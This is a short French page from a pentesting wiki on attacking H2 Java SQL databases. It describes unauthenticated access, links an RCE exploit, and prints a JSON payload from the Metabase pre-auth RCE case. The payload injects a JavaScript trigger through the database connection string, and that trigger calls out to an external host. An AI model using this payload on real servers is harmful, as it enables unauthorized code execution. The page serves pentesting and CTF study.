# H2 - Base de données Java SQL

{{#include ../../banners/hacktricks-training.md}}

Page officielle : [https://www.h2database.com/html/main.html](https://www.h2database.com/html/main.html)

## Accès

Vous pouvez indiquer un **nom de base de données non existant** afin de **créer une nouvelle base de données sans identifiants valides** (**non authentifié**) :

![](<../../images/image (131).png>)

Ou si vous savez par exemple qu'un **mysql est en cours d'exécution** et que vous connaissez le **nom de la base de données** et les **identifiants** pour cette base de données, vous pouvez simplement y accéder :

![](<../../images/image (201).png>)

_**Astuce de la box Hawk de HTB.**_

## **RCE**

Ayant accès pour communiquer avec la base de données H2, vérifiez cet exploit pour obtenir RCE dessus : [https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed](https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed)

## Injection SQL H2 vers RCE

Dans [**ce post**](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/), un payload est expliqué pour obtenir **RCE via une base de données H2** en abusant d'une **injection SQL**.
```json
[...]
"details":
{
"db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER IAMPWNED BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nnew java.net.URL('https://example.com/pwn134').openConnection().getContentLength()\n$$--=x\\;",
"advanced-options": false,
"ssl": true
},
[...]
```
{{#include ../../banners/hacktricks-training.md}}
